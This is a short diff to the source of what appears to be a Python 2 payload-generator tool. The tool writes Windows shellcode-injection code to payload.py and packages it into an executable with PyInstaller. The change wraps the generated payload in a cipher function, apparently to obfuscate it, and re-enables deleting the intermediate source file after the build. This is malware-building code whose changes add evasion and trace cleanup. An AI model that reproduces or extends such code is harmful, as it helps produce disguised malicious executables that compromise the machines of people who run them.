@@ -182,8 +182,8 @@ try:
 
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(
-                SHELLCODE.injectwindows % (ez2read_shellcode))
+            Filesave.write(FUNCTIONS.DoPyCipher(
+                SHELLCODE.injectwindows % (ez2read_shellcode)))
             Filesave.close()
 
         print '[*] Creating Payload using Pyinstaller...'
@@ -230,7 +230,7 @@ try:
         os.system('rm %s/dist -r' % payloaddir)
         os.system('rm %s/build -r' % payloaddir)
         os.system('rm %s/*.spec' % payloaddir)
-        #os.system('rm %s/payload.py' % payloaddir)
+        os.system('rm %s/payload.py' % payloaddir)
         print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' % (payloaddir, payloadname) + t.normal
 
     if want_to_payloadinexe.lower() == 'y':
